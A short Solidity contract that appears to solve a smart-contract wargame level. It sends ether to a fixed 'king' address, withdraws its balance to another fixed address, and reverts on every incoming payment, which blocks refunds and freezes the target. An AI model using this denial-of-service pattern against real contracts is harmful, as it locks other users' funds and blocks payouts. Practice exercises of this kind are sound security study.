// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


contract Contract {
    function deposit() payable public {
    }

    function beKing() public {
        payable(0xFD53eBd5F76535122FFd7653d142f62e890649B9).call{value: 1000000000000000}("");
    }

    function withdraw() public {
        payable(0x77777dDEd3453C22D0503AFe0cD10E65bcB737EC).transfer(address(this).balance);
    }

    receive() external payable {
        revert("hi, yannick");
    }
}
